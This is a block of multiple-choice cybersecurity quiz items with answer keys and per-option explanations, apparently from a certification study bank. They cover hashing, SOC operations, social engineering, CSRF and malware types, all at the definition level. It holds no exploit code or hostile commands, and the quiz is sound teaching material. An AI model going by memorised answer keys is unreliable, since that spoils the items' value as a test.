  {id:374,domain:G,question:"What is salting in the context of password storage?",options:["Encrypting passwords with a master key","Adding a unique random value to each password before hashing to prevent rainbow table attacks","Compressing password databases","Adding complexity requirements to passwords"],answer:1,explanation:"Salts ensure identical passwords produce different hashes, defeating precomputed rainbow table attacks and making per-password cracking necessary.",optionExplanations:["Encrypting passwords is different from hashing; salting is a technique used with hashing, not encryption.","A salt is a unique random string prepended or appended to each password before hashing, ensuring two identical passwords produce completely different stored hashes.","Password database compression is a storage optimization; salting is a security technique protecting hashes from precomputed attacks.","Password complexity requirements are policy controls; salting is a technical hash protection mechanism applied during storage."]},
  {id:375,domain:O,question:"What is the purpose of security orchestration, automation, and response (SOAR)?",options:["Replacing human security analysts entirely","Automating repetitive security tasks and coordinating responses across security tools to improve efficiency and speed","Providing a single security dashboard","Performing automated penetration testing"],answer:1,explanation:"SOAR platforms run playbooks to automatically triage alerts, enrich data, contain threats, and coordinate multi-tool response actions.",optionExplanations:["SOAR augments security analysts by handling routine tasks; human judgment remains essential for complex decisions.","SOAR platforms automate repetitive tasks (IP lookups, ticket creation, containment actions) and orchestrate workflows across SIEM, EDR, firewall, and ticketing systems.","A single dashboard is a feature of SIEM and security operations centers; SOAR is about automated action and workflow.","Automated penetration testing tools are separate security products; SOAR focuses on detecting and responding to real incidents."]},
  {id:376,domain:T,question:"What is pretexting in social engineering?",options:["Sending mass phishing emails","Creating a fabricated scenario or false identity to manipulate a target into providing information or access","Threatening targets with legal action to extract information","Installing fake websites to capture credentials"],answer:1,explanation:"Pretexting involves creating a believable false context (impersonating IT support, auditors, vendors) to make targets comply with requests.",optionExplanations:["Mass phishing emails are phishing attacks without sophisticated pretexts; pretexting involves a specific narrative.","Pretexting builds a detailed false scenario to establish trust — pretending to be a coworker needing urgent help, an auditor requiring access, or a vendor verifying an order.","Threatening legal action is intimidation/vishing; pretexting uses persuasion through false identity rather than threats.","Fake websites for credential capture are pharming or phishing; pretexting is a social manipulation technique focused on human interaction."]},
  {id:377,domain:A,question:"What is the purpose of a hardware security module (HSM)?",options:["Providing physical server rack security","A tamper-resistant hardware device that securely stores and manages cryptographic keys and performs cryptographic operations","Monitoring hardware component temperatures","Encrypting hard drives"],answer:1,explanation:"HSMs protect private keys by ensuring they never leave the hardware boundary, with tamper-evident mechanisms that destroy keys if tampering is detected.",optionExplanations:["Physical rack security is a data center concern; HSMs protect cryptographic material.","HSMs are purpose-built hardware devices with physical tamper protection that generate, store, and use keys — private keys never leave the HSM in plaintext.","Temperature monitoring is infrastructure management; HSMs perform cryptographic operations with keys stored in protected hardware.","Drive encryption software can use keys; HSMs are where those keys are generated and securely stored."]},
  {id:378,domain:O,question:"What is the mean time to detect (MTTD) security metric?",options:["Average time to fix vulnerabilities","The average time from when a threat actor gains access until the organization detects the compromise","Average time to complete security training","The typical duration of a DDoS attack"],answer:1,explanation:"MTTD measures detection capability — lower is better. The industry average has historically been months, giving attackers time to cause significant damage.",optionExplanations:["Mean time to fix/remediate vulnerabilities is MTTR (Mean Time to Repair/Remediate); MTTD is specifically about detection.","MTTD measures the gap between initial compromise and discovery, representing the attacker's dwell time and opportunity to cause damage.","Security training completion time is a compliance metric; MTTD is an operational security effectiveness measurement.","DDoS attack duration varies; MTTD measures the organization's ability to detect any type of compromise."]},
  {id:379,domain:G,question:"What is the purpose of certificate transparency (CT) logs?",options:["Encrypting certificate data","A public, append-only log where CAs must record all issued certificates, enabling detection of misissued or malicious certificates","Storing expired certificates for auditing","Distributing certificate revocation information"],answer:1,explanation:"CT logs allow domain owners and browsers to detect unauthorized certificates issued for their domains (catching rogue CAs and certificate abuse).",optionExplanations:["CT logs make certificate issuance public and auditable; they don't encrypt certificate data.","Certificate transparency requires CAs to log every certificate to public, tamper-evident logs, allowing anyone to monitor for unauthorized certificates for their domains.","Expired certificate storage is a different archival concern; CT logs focus on documenting all newly issued certificates.","CRL and OCSP distribute revocation information; CT logs document the existence of issued certificates for monitoring purposes."]},
  {id:380,domain:T,question:"What is a supply chain attack?",options:["Physical theft from a warehouse","Compromising a target by attacking a less-secure element in their supply chain (software vendor, hardware manufacturer, managed service provider)","Attacking multiple targets simultaneously with the same malware","Disrupting logistics systems with ransomware"],answer:1,explanation:"Supply chain attacks like SolarWinds compromise trusted software/hardware that targets install, achieving broad access via a trusted channel.",optionExplanations:["Physical warehouse theft is a physical security incident; supply chain attacks compromise digital supply chain elements.","Supply chain attacks insert malware into trusted software updates, compromise hardware at manufacturing, or pivot through trusted managed service providers to reach the ultimate target.","Attacking multiple targets with the same malware is a campaign; supply chain attacks specifically exploit the trust relationship between vendors and their customers.","Ransomware on logistics systems is a direct attack; supply chain attacks use compromised vendor relationships to reach higher-value targets."]},
  {id:381,domain:A,question:"What is containerization from a security perspective?",options:["Physical server isolation","Packaging applications with their dependencies in isolated containers that share an OS kernel, with security provided by namespace and cgroup isolation","Encrypting application data","Deploying applications in virtual machines"],answer:1,explanation:"Container security relies on kernel namespace isolation, but containers share the host kernel — a kernel exploit can escape all containers on that host.",optionExplanations:["Physical server isolation is hardware separation; containerization is OS-level isolation on shared hardware.","Containers use Linux namespaces (process, network, mount) and cgroups to isolate applications, but share the host kernel, making kernel security critical.","Data encryption is a separate control; containerization is about application isolation and resource control.","VMs virtualize hardware for full OS isolation; containers share the host OS kernel, providing lighter but less complete isolation."]},
  {id:382,domain:P,question:"What is data sovereignty?",options:["Owning the intellectual property of data","The principle that data is subject to the laws and governance of the country where it is physically stored or processed","Government ownership of all citizen data","Encrypting data with nationally approved algorithms"],answer:1,explanation:"Data sovereignty concerns arise when organizations store data in foreign countries where local laws may compel disclosure without the data owner's consent.",optionExplanations:["Intellectual property rights are different from data sovereignty; sovereignty concerns which government's laws govern the data.","Data sovereignty means data stored in Country A is subject to Country A's laws — including government access laws — regardless of where the data owner is located.","Government ownership of citizen data is not data sovereignty; sovereignty is about legal jurisdiction over data.","Using nationally approved encryption algorithms is a compliance requirement; sovereignty is about geographic jurisdiction and applicable law."]},
  {id:383,domain:O,question:"What is the purpose of a security operations center (SOC)?",options:["Developing software security requirements","A centralized team and facility dedicated to continuously monitoring, detecting, and responding to security threats","Performing annual security audits","Managing IT infrastructure performance"],answer:1,explanation:"SOCs provide 24/7 monitoring, alert triage, threat hunting, and incident response coordination to maintain organizational security posture.",optionExplanations:["Software security requirements are defined in secure development programs; SOCs focus on operational monitoring and response.","A SOC centralizes security monitoring tools (SIEM, EDR), analysts, and processes to provide continuous detection and response capabilities.","Annual audits are periodic compliance activities; SOCs provide continuous, ongoing security operations.","IT infrastructure performance is managed by NOC (Network Operations Center); SOCs focus on security threats and incidents."]},
  {id:384,domain:T,question:"What is DNS poisoning (DNS cache poisoning)?",options:["Overloading a DNS server with requests","Inserting fraudulent DNS records into a resolver's cache to redirect users to malicious servers","Deleting DNS records for a domain","Encrypting DNS traffic to prevent eavesdropping"],answer:1,explanation:"DNS poisoning redirects traffic by corrupting cached DNS responses, sending users to attacker-controlled IPs while they believe they're visiting legitimate sites.",optionExplanations:["Overloading a DNS server with requests is a DNS DDoS attack; poisoning modifies cached records.","DNS cache poisoning inserts malicious DNS entries that redirect users to attacker-controlled servers — enabling credential theft, malware distribution, or man-in-the-middle attacks.","Deleting DNS records creates unavailability; poisoning redirects to malicious destinations.","DNS encryption (DoH/DoT) is a defense against interception; poisoning attacks the cache records themselves."]},
  {id:385,domain:G,question:"What is the principle of non-repudiation?",options:["The ability to delete transaction records","The assurance that a party cannot deny having performed an action or sent a message","Ensuring all parties remain anonymous","Preventing unauthorized access to records"],answer:1,explanation:"Non-repudiation (achieved through digital signatures and audit logs) ensures entities cannot deny actions — essential for legal accountability and forensics.",optionExplanations:["Deleting transaction records would undermine non-repudiation; the principle ensures records cannot be disavowed.","Non-repudiation ensures the originator of a message or performer of an action cannot credibly deny it — digital signatures cryptographically bind identity to actions.","Anonymity contradicts non-repudiation; non-repudiation requires traceable identity.","Preventing unauthorized access is the confidentiality and access control goal; non-repudiation ensures authorized users cannot disavow their legitimate actions."]},
  {id:386,domain:A,question:"What is a reverse proxy and how does it improve security?",options:["A firewall that blocks outbound traffic","A server that sits in front of web servers, forwarding client requests while hiding backend server identity and providing centralized security controls","A VPN server for remote users","A proxy that caches web content for performance"],answer:1,explanation:"Reverse proxies hide server architecture, terminate SSL, apply WAF rules, provide DDoS protection, and load balance — all in a security-controlled layer.",optionExplanations:["Outbound traffic blocking is done by forward proxies; reverse proxies handle inbound traffic to protected web servers.","A reverse proxy receives client requests, applies security inspection, and forwards to appropriate backend servers — clients never directly communicate with backend servers.","VPNs provide encrypted tunnels for remote users; reverse proxies control access to web services from external users.","Forward proxies cache content for outbound browsing performance; reverse proxies serve inbound requests and can cache for performance but primarily provide security and routing."]},
  {id:387,domain:O,question:"What is digital forensics chain of custody?",options:["A technique for recovering deleted files","The documented, unbroken record of who has possessed and accessed evidence from collection through legal proceedings","A method for decrypting seized devices","A process for notifying law enforcement of cybercrime"],answer:1,explanation:"Chain of custody ensures evidence is admissible in court by proving it was not tampered with and was handled by accountable, documented individuals.",optionExplanations:["File recovery is a forensic technique; chain of custody is the documentation process surrounding evidence handling.","Chain of custody tracks every transfer of evidence — who collected it, when, where it was stored, who accessed it — creating an auditable record proving evidence integrity.","Device decryption is a forensic examination step; chain of custody is the overarching documentation framework for all evidence handling.","Law enforcement notification is an incident response activity; chain of custody is the evidence integrity framework applied once evidence is collected."]},
  {id:388,domain:T,question:"What is a man-in-the-browser (MiTB) attack?",options:["A physical attack on browser infrastructure","Malware that intercepts and modifies browser transactions in real-time before they are encrypted, evading SSL protection","Stealing browser history and saved passwords","Injecting ads into web pages"],answer:1,explanation:"MiTB malware sits inside the browser, modifying transactions (like changing bank transfer amounts) after the user initiates them but before encryption.",optionExplanations:["Physical attacks on browser infrastructure are not what MiTB describes; it's a malware category operating inside the browser process.","MiTB malware (like Zeus/SpyEye) hooks into browser APIs to intercept and modify content that users see and transactions they submit, defeating HTTPS because modification happens before encryption.","Credential theft is a function of keyloggers and password stealers; MiTB specifically modifies live browser transactions.","Ad injection malware is adware; MiTB is specifically designed to manipulate financial and sensitive transactions in real-time."]},
  {id:389,domain:P,question:"What is the purpose of an acceptable use policy (AUP)?",options:["Describing network architecture","Defining what actions are permitted and prohibited when using organizational technology resources","Setting software development standards","Outlining physical security requirements"],answer:1,explanation:"AUPs set clear expectations for technology use, provide legal basis for disciplinary action, and help establish reasonable personal use boundaries.",optionExplanations:["Network architecture is documented in technical diagrams; AUPs govern behavior related to using those networks.","An AUP defines permitted activities (work-related internet use) and prohibited ones (downloading pirated software, accessing inappropriate content) on organizational systems and networks.","Software development standards are in coding guidelines; AUPs cover the broader acceptable use of technology resources by all users.","Physical security requirements are in physical security policies; AUPs focus on the appropriate use of IT resources and systems."]},
  {id:390,domain:G,question:"What is the difference between hashing and encryption?",options:["They are the same process with different names","Hashing is a one-way function producing a fixed-length digest; encryption is reversible with the appropriate key","Encryption is faster than hashing for all use cases","Hashing uses keys while encryption does not"],answer:1,explanation:"Hashing cannot be reversed to retrieve the original data — it's for integrity verification, not confidentiality. Encryption can be reversed with the key.",optionExplanations:["Hashing and encryption are fundamentally different operations serving different security goals.","Hashing is one-way (you cannot recover the original input); encryption is two-way (decryption with the key recovers the original). Hashing serves integrity; encryption serves confidentiality.","Hash functions (SHA-256) are generally fast; encryption speed depends on algorithm and key size. Both have scenarios where each is faster.","Symmetric encryption uses keys; standard hashing uses no keys (though HMAC adds a key to hashing). This is the opposite of what's stated."]},
  {id:391,domain:T,question:"What is a fileless malware attack?",options:["Malware that hides in image files","Malware that operates entirely in memory using legitimate system tools, leaving no persistent files on disk","Malware that targets PDF files","Malware that encrypts but does not delete files"],answer:1,explanation:"Fileless malware (using PowerShell, WMI, registry) is difficult to detect with traditional AV since it never writes files to disk that can be scanned.",optionExplanations:["Malware that hides in image files uses steganography; fileless malware specifically avoids writing files at all.","Fileless malware resides entirely in RAM, uses built-in tools like PowerShell, and persists through registry keys or scheduled tasks — never writing traditional executable files.","PDF-targeting exploits may deliver malware; fileless techniques describe how malware operates after initial delivery.","File-encrypting malware is ransomware; fileless describes the operating mechanism of staying memory-resident without disk artifacts."]},
  {id:392,domain:A,question:"What is a DMZ (demilitarized zone) in network security?",options:["A region where no network activity is permitted","A network segment between the internet and internal network that hosts public-facing services while isolating the internal network","A zone designated for wireless access points","A network area reserved for security tools and monitoring"],answer:1,explanation:"DMZs host web servers, mail servers, and DNS servers that need internet exposure while the firewall prevents direct internet access to internal systems.",optionExplanations:["Network-free zones don't apply to DMZ; it's an active network zone with specific connectivity rules.","A DMZ is flanked by two firewalls — one controlling internet traffic to the DMZ, another controlling DMZ traffic to the internal network, providing layered protection.","Wireless access points are placed in appropriate zones; a separate DMZ may exist for guest wireless but the DMZ concept is broader.","Security tools typically reside in management networks; the DMZ hosts services that need to be publicly accessible."]},
  {id:393,domain:O,question:"What is the purpose of a honeypot in network security?",options:["Collecting honey bees for sustainable operations","A decoy system designed to attract and detect attackers, gathering intelligence on their techniques while alerting defenders","A database for storing security certificates","Blocking malicious traffic at the network perimeter"],answer:1,explanation:"Honeypots distract attackers, provide intelligence on TTPs, trigger alerts when accessed (since no legitimate user should access them), and slow down attacks.",optionExplanations:["Honeypots are security deception tools unrelated to actual honey or sustainable operations.","A honeypot mimics a real system, making it attractive to attackers; any interaction with it is suspicious, enabling detection and intelligence gathering on attacker behavior.","Certificate storage is handled by certificate authorities and trust stores; honeypots are deception systems.","Perimeter traffic blocking is done by firewalls and IPS; honeypots deliberately allow attackers in to monitor their actions."]},
  {id:394,domain:T,question:"What is DNS hijacking?",options:["Registering expired domain names","Modifying DNS settings on a victim's device or router to redirect DNS queries to attacker-controlled resolvers","Flooding DNS servers with queries","Creating wildcard DNS records"],answer:1,explanation:"DNS hijacking redirects victims through malicious resolvers that can modify all DNS responses, enabling MitM attacks, phishing, and traffic interception.",optionExplanations:["Registering expired domains is domain squatting; hijacking modifies existing DNS settings.","DNS hijacking changes the DNS resolver settings on a device or router (via malware, router exploitation, or ISP manipulation) so all DNS queries go through attacker-controlled infrastructure.","Flooding DNS servers is a DDoS attack; hijacking redirects resolution rather than disrupting availability.","Wildcard DNS records are a legitimate DNS configuration; hijacking is an attack modifying DNS resolution paths."]},
  {id:395,domain:G,question:"What is elliptic curve cryptography (ECC)?",options:["A type of block cipher algorithm","An asymmetric cryptographic approach using elliptic curve mathematics to achieve equivalent security to RSA with much smaller key sizes","A hash function family","A symmetric key exchange protocol"],answer:1,explanation:"ECC achieves equivalent security to RSA-2048 with only 256-bit keys, making it ideal for resource-constrained devices and mobile applications.",optionExplanations:["Block ciphers (AES, DES) are symmetric encryption algorithms; ECC is asymmetric.","ECC uses algebraic structures of elliptic curves over finite fields to create public/private key pairs — ECDSA for signatures, ECDH for key exchange — with smaller keys than RSA.","Hash functions (SHA family) produce fixed-length digests; ECC is an asymmetric key algorithm.","Symmetric key exchange is done by protocols like Diffie-Hellman; ECDH is the elliptic curve variant of DH, but ECC itself is an asymmetric cryptography system."]},
  {id:396,domain:P,question:"What is consent management in data privacy?",options:["Managing system administrator access rights","Processes and systems for obtaining, recording, and honoring individuals' consent decisions about the collection and use of their personal data","Approving security tool configurations","Managing legal contracts with data processors"],answer:1,explanation:"Consent management is critical for GDPR compliance — organizations must obtain specific, informed consent and be able to prove it and honor withdrawals.",optionExplanations:["System access rights are managed by identity and access management systems; consent management is about data subject permissions.","Consent management captures when, how, and for what purposes individuals agreed to data processing, maintains records, and enforces consent-based restrictions across systems.","Security configuration approval is a change management function; consent management is about individual rights over personal data.","Legal contracts with data processors are data processing agreements; consent management is about the relationship between organizations and individual data subjects."]},
  {id:397,domain:A,question:"What is the zero trust security model?",options:["Trusting internal network traffic implicitly","A security framework requiring verification of every user, device, and connection regardless of network location before granting access to resources","Never allowing employees to access sensitive data","Blocking all external network connections"],answer:1,explanation:"Zero trust ('never trust, always verify') eliminates the concept of a trusted internal network — all access requires authentication, authorization, and continuous validation.",optionExplanations:["Implicit trust of internal traffic is the traditional perimeter model; zero trust explicitly rejects this assumption.","Zero trust requires verifying identity, device health, and context for every access request — even from inside the corporate network — and grants least-privilege access to specific resources.","Zero trust is about verified access, not about restricting all access to sensitive data from employees.","Blocking all external connections is an extreme isolation approach; zero trust allows external connections but verifies them rigorously."]},
  {id:398,domain:O,question:"What is a security baseline?",options:["The minimum acceptable security configuration for a system or device, established through policies and hardening guides","The lowest point of security in an organization","A security tool for measuring network traffic","The starting point for a penetration test"],answer:0,explanation:"Security baselines define minimum required configurations (patching, disabled services, password policies) ensuring consistent security posture across similar systems.",optionExplanations:["A security baseline defines the minimum required security configuration — OS hardening settings, disabled unnecessary services, configured logging — against which systems are compared.","The lowest security point is a vulnerability finding; a baseline is a defined minimum standard to which systems are configured.","Network traffic measurement tools are flow analyzers and packet capture tools; a baseline is a configuration standard.","Penetration tests start from an attacker's perspective; baselines are defensive configuration standards."]},
  {id:399,domain:T,question:"What is tailgating in physical security?",options:["Following someone online to gather information","Gaining unauthorized physical access to a secured area by closely following an authorized person through a controlled entry point","Attaching malicious devices to the back of servers","Intercepting communications from behind a target's location"],answer:1,explanation:"Tailgating bypasses physical access controls (key cards, PINs) by piggybacking on an authorized person's entry — social courtesy enables the attack.",optionExplanations:["Following someone online to gather information is cyberstalking or OSINT; tailgating is physical unauthorized access.","Tailgating (or piggybacking) exploits people's tendency to hold doors open — an attacker enters a secure area immediately after an authorized person without using their own credentials.","Attaching malicious devices to servers is a hardware attack; tailgating is about gaining physical entry to a facility.","Intercepting communications is a man-in-the-middle attack; tailgating is a physical security breach technique."]},
  {id:400,domain:G,question:"What is the Diffie-Hellman key exchange?",options:["A symmetric encryption algorithm","A method allowing two parties to establish a shared secret over an insecure channel without prior shared keys","A hash function for digital signatures","A protocol for certificate revocation"],answer:1,explanation:"DH enables two parties to derive the same shared secret using public values and private values, without ever transmitting the secret itself.",optionExplanations:["DH is a key exchange protocol, not an encryption algorithm; it establishes a shared key but doesn't encrypt data.","Diffie-Hellman uses mathematical properties of modular exponentiation — each party contributes public values, and the mathematics produces the same shared secret on both ends without it ever crossing the network.","Hash functions (SHA) produce digests; DH establishes shared secrets for subsequent use in symmetric encryption.","CRL and OCSP handle certificate revocation; DH is a key exchange mechanism used in TLS, IPsec, and SSH."]},
  {id:401,domain:T,question:"What is vishing?",options:["A visual phishing technique using fake videos","Voice phishing — using phone calls to deceive victims into revealing sensitive information or performing actions","A phishing attack targeting VoIP systems","Sending phishing SMS messages"],answer:1,explanation:"Vishing attacks impersonate banks, IRS, tech support, or government agencies via phone, creating urgency to extract credentials, SSNs, or payments.",optionExplanations:["Visual phishing using fake videos is deepfake-based attacks; vishing is specifically voice/phone-based.","Vishing (voice phishing) uses phone calls — often spoofing caller ID — to impersonate trusted entities and pressure victims into revealing sensitive information.","Attacks targeting VoIP systems are VoIP-specific attacks; vishing describes the social engineering technique regardless of whether VoIP or traditional telephony is used.","SMS-based phishing is smishing; vishing specifically uses voice calls."]},
  {id:402,domain:A,question:"What is infrastructure as code (IaC) from a security perspective?",options:["Writing code to attack infrastructure","Defining and managing IT infrastructure through machine-readable configuration files, enabling consistent, auditable, and version-controlled deployments","Replacing infrastructure teams with automated systems","A cloud cost management technique"],answer:1,explanation:"IaC enables security review of infrastructure configurations, consistent secure deployments, and detection of configuration drift through code review and scanning.",optionExplanations:["Attacking infrastructure is a penetration testing or threat actor activity; IaC is a DevOps and security management practice.","IaC (Terraform, CloudFormation, Ansible) treats infrastructure configuration as code — enabling peer review, version control, automated security scanning, and reproducible deployments.","IaC tools automate deployment tasks but don't replace teams; they provide tools that allow smaller teams to manage larger environments securely.","Cloud cost management uses cost optimization tools; IaC is primarily about consistent, automated infrastructure deployment."]},
  {id:403,domain:O,question:"What is purple teaming?",options:["A team wearing both red and blue uniforms","A collaborative exercise where red team and blue team work together to maximize learning and improve defensive capabilities","A penetration testing team specializing in web applications","An advanced persistent threat simulation"],answer:1,explanation:"Purple teaming breaks down the adversarial separation of red vs. blue, creating collaborative learning sessions that improve both offensive techniques and defensive detections.",optionExplanations:["The color metaphor refers to blending red (attack) and blue (defense) roles; it's not about uniforms.","Purple teaming has red team attackers share techniques in real-time with blue team defenders, who then tune detections and responses — creating immediate feedback loops for security improvement.","Web application penetration testing is a specific red team engagement; purple teaming is a collaborative methodology.","APT simulations can be part of purple team exercises, but purple teaming is specifically about the collaborative, knowledge-sharing structure."]},
  {id:404,domain:T,question:"What is a logic bomb?",options:["Malware that self-replicates through networks","Malicious code that executes when specific trigger conditions are met, such as a date/time or specific event","An exploit that causes buffer overflow","A DoS attack triggered by logic errors"],answer:1,explanation:"Logic bombs are often planted by insiders (disgruntled employees) and can destroy data, disrupt operations, or exfiltrate information when conditions trigger.",optionExplanations:["Self-replicating network malware is a worm; logic bombs are dormant until triggered.","Logic bombs lay dormant until a condition is met — a specific date (Friday 13th), a username being deleted, or a file being opened — then execute their payload.","Buffer overflow exploits are code exploitation techniques; logic bombs are concealed malicious code awaiting trigger conditions.","DoS attacks aim for unavailability; logic bombs are concealed payloads that activate when specific conditions are satisfied."]},
  {id:405,domain:G,question:"What is stream ciphers vs. block ciphers?",options:["Stream ciphers are slower; block ciphers are faster","Stream ciphers encrypt data one bit or byte at a time; block ciphers encrypt fixed-size chunks of data","Block ciphers are used for wireless; stream ciphers for wired networks","They are different names for the same algorithm type"],answer:1,explanation:"Stream ciphers (RC4) are fast and good for real-time communications; block ciphers (AES) are used for bulk data encryption with modes like CBC or GCM.",optionExplanations:["Speed depends on implementation and use case; stream ciphers can be very fast for certain uses, while block ciphers in hardware can also be very fast.","Stream ciphers generate a keystream and XOR it with plaintext bit-by-bit; block ciphers divide plaintext into fixed blocks (128-bit for AES) and encrypt each block.","Both cipher types can be used in any network context; the choice depends on performance needs and security requirements, not network medium.","Stream and block ciphers are fundamentally different cryptographic approaches, not synonyms."]},
  {id:406,domain:P,question:"What is the purpose of a data processing agreement (DPA)?",options:["A contract for purchasing software licenses","A legally required contract between a data controller and processor defining how personal data will be processed, protected, and handled","An agreement for system maintenance services","A service level agreement for IT support"],answer:1,explanation:"DPAs (required by GDPR Article 28) ensure data processors implement appropriate security and only process data per the controller's instructions.",optionExplanations:["Software license contracts are vendor agreements; DPAs specifically govern personal data processing responsibilities.","A DPA establishes obligations for how a service provider processes personal data — security requirements, subprocessor restrictions, audit rights, breach notification timelines, and data deletion.","System maintenance agreements cover IT services; DPAs specifically address personal data handling obligations of service providers.","SLAs define service availability and performance; DPAs define data protection responsibilities and legal obligations for personal data processing."]},
  {id:407,domain:A,question:"What is a security information and event management (SIEM) system's primary function?",options:["Encrypting log data during transmission","Collecting, normalizing, and correlating security events from multiple sources to provide centralized visibility and alert on potential threats","Generating security reports for compliance","Performing vulnerability assessments across the network"],answer:1,explanation:"SIEMs aggregate events from firewalls, endpoints, applications, and cloud to detect patterns that individual tools cannot see in isolation.",optionExplanations:["Log encryption during transmission is handled by the log collection protocol (TLS); SIEM's function is correlation and analysis.","SIEM platforms collect logs from diverse sources, normalize them to a common format, apply correlation rules to detect threats, and alert analysts — providing a unified security monitoring capability.","Compliance reporting is a secondary SIEM function; correlation and detection is the primary security purpose.","Vulnerability assessments are performed by specialized tools (Nessus, Qualys); SIEM focuses on runtime event monitoring and correlation."]},
  {id:408,domain:T,question:"What is cross-site request forgery (CSRF)?",options:["Stealing session cookies to impersonate users","An attack that tricks an authenticated user into unknowingly submitting a forged request to a web application, exploiting the application's trust in the user","Injecting malicious scripts into web pages viewed by others","Intercepting HTTP requests between client and server"],answer:1,explanation:"CSRF exploits the browser's automatic inclusion of authentication cookies — a victim visiting a malicious site unknowingly triggers authenticated actions on another site.",optionExplanations:["Stealing session cookies is session hijacking or XSS; CSRF doesn't require stealing cookies — it exploits the browser's automatic cookie submission.","CSRF tricks the browser into making authenticated requests to target sites — if the victim is logged into their bank, an evil site can trigger fund transfers without the victim knowing.","Injecting malicious scripts is XSS (Cross-Site Scripting); CSRF forges requests rather than injecting scripts.","Request interception is man-in-the-middle; CSRF manipulates the victim's authenticated browser session from a malicious site."]},
  {id:409,domain:O,question:"What is an intrusion prevention system (IPS) and how does it differ from an IDS?",options:["IPS detects; IDS prevents","An IDS monitors and alerts on suspicious activity; an IPS monitors and actively blocks or mitigates suspicious activity","They perform identical functions but use different protocols","IPS is software-based; IDS is hardware-based"],answer:1,explanation:"An IDS is passive (alerts only); an IPS is inline and active (detects and blocks). Both use signatures and anomaly detection but IPS can respond automatically.",optionExplanations:["IDS detects and alerts; IPS detects and prevents — the question has this backwards.","IDS sensors are typically passive (receive a copy of traffic); IPS sensors sit inline and can drop, reset, or modify malicious traffic in real-time.","Both can detect the same attacks; the key difference is the ability to actively block vs. only alert.","Both IDS and IPS can be implemented in hardware appliances or software; the distinction is about passive monitoring vs. active inline prevention."]},
  {id:410,domain:G,question:"What is biometric authentication and its primary security risk?",options:["Using location data for authentication — risk is GPS spoofing","Using unique biological characteristics for authentication — primary risk is that biometrics cannot be changed if compromised","Using behavioral patterns for access control — risk is pattern prediction","Using device certificates for authentication — risk is certificate theft"],answer:1,explanation:"Fingerprints, iris scans, and face recognition authenticate uniquely but if compromised (database breach), users cannot get new fingerprints like they can new passwords.",optionExplanations:["Location-based authentication uses GPS/IP geolocation; biometrics use physical or behavioral characteristics of the person.","Biometric authentication uses fingerprints, retinas, voiceprints, or facial features — uniquely identifying but immutable; if a biometric database is breached, affected individuals are permanently compromised.","Behavioral biometrics (typing rhythm, gait) are a biometric subtype; the primary concern is the immutability of all biometric data.","Device certificates are certificate-based authentication; biometrics are person-based biological measurements."]},
  {id:411,domain:T,question:"What is a Trojan horse in cybersecurity?",options:["A self-replicating virus","Malware disguised as legitimate software that performs malicious actions while appearing to provide expected functionality","A network worm that spreads through email","Malware that encrypts files for ransom"],answer:1,explanation:"Trojans rely on social engineering — users willingly install what appears to be useful software that secretly installs backdoors, RATs, or credential stealers.",optionExplanations:["Self-replicating code is a virus or worm; Trojans do not self-replicate — they rely on users to install them.","A Trojan (named after the mythological Trojan horse) appears as legitimate or desirable software (game, utility, update) while secretly performing malicious actions in the background.","Network worms spread autonomously through networks; Trojans require user installation and do not self-propagate.","File-encrypting malware is ransomware; Trojans are the delivery/concealment mechanism that can deliver ransomware or other payloads."]},
  {id:412,domain:A,question:"What is API security and why is it critical in modern architectures?",options:["Securing physical server access","Protecting application programming interfaces from abuse, unauthorized access, and exploitation since APIs are now the primary way applications exchange data","Encrypting network packets at the transport layer","Managing SSL certificates for web services"],answer:1,explanation:"APIs expose business logic and data directly — OWASP API Security Top 10 covers broken object level authorization, excessive data exposure, and injection attacks specific to APIs.",optionExplanations:["Physical server security is a data center control; API security protects the software interfaces that applications expose.","API security addresses authentication, authorization, rate limiting, input validation, and output filtering for the programmatic interfaces that modern applications use to communicate.","Transport layer encryption (TLS) is one component of API security but doesn't address authorization and application-layer API attacks.","SSL certificate management supports API security; API security is a broader discipline covering the entire API lifecycle and threat surface."]},
  {id:413,domain:O,question:"What is change management in IT security?",options:["Managing organizational restructuring","A formal process for requesting, reviewing, approving, implementing, and documenting changes to IT systems to prevent unauthorized or poorly planned changes","Managing version control for software code","Updating employee access permissions"],answer:1,explanation:"Change management prevents outages and security incidents caused by unauthorized, poorly tested, or conflicting changes to production systems.",optionExplanations:["Organizational restructuring is an HR/management function; IT change management governs system modifications.","Change management (using tools like ServiceNow) requires formal requests, risk assessment, approval (CAB review), testing, implementation windows, and rollback plans before any production change.","Version control (Git) is a developer tool; change management is the broader governance process controlling what changes reach production and when.","Access permission updates are an identity management function; change management controls all types of changes to IT infrastructure and systems."]},
  {id:414,domain:T,question:"What is a brute force attack?",options:["A physical attack on network infrastructure","Systematically trying all possible combinations of passwords or keys until the correct one is found","Using social engineering to obtain passwords","Exploiting software vulnerabilities to bypass authentication"],answer:1,explanation:"Brute force attacks are resource-intensive but guaranteed to succeed given time — countermeasures include account lockouts, CAPTCHAs, and rate limiting.",optionExplanations:["Physical attacks on infrastructure are hardware-level attacks; brute force is a systematic authentication attack.","Brute force tries every possible password or key — in order or random — until finding the correct one. Against long, complex passwords this is computationally infeasible.","Using social engineering to obtain passwords is phishing or pretexting; brute force is purely computational.","Exploiting software vulnerabilities is an exploit-based attack; brute force systematically tests credentials rather than exploiting code flaws."]},
  {id:415,domain:G,question:"What is steganography?",options:["A form of data compression","The practice of hiding secret information within ordinary, non-secret data or files (images, audio) to avoid detection","Encrypting data with multiple layers of encryption","A technique for watermarking copyrighted content"],answer:1,explanation:"Steganography hides the existence of a message (vs. encryption which hides the meaning) — attackers use it to exfiltrate data hidden in images uploaded to public sites.",optionExplanations:["Data compression reduces file size; steganography hides information within files without necessarily changing their size significantly.","Steganography conceals messages within carrier files — hiding text in the least significant bits of image pixels, inaudible audio frequencies, or document whitespace — so observers don't know a message exists.","Multiple encryption layers are encryption techniques; steganography is about concealment, not encryption.","Digital watermarking embeds ownership information; steganography embeds secret messages — both hide data in files but serve different purposes."]},
